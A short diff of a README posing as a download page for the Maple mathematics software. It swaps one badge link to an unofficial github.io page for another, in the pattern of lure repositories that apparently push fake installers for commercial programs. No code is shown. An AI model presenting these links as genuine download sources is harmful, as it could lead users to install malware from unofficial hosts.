@@ -1,10 +1,8 @@
 # Maple – Mathematics & Symbolic Computation Software
 
-## 📥 Download Maple
 
-[![⬇️ Download Maple](https://img.shields.io/badge/Download-Maple-blue?style=for-the-badge&logo=mathworks)](https://jamesonwhitneytvbm.github.io/.github/maple-mathematics-symbolic-computation)
+[![Try Maple – Mathematics & Symbolic](https://img.shields.io/badge/Try-Maple%20%E2%80%93%20Mathematics%20%26%20Symbolic-A63D28?style=flat)](https://maple-mathematics-symbolic.github.io/.github/)
 
----
 
 ## 📦 How to Install
 
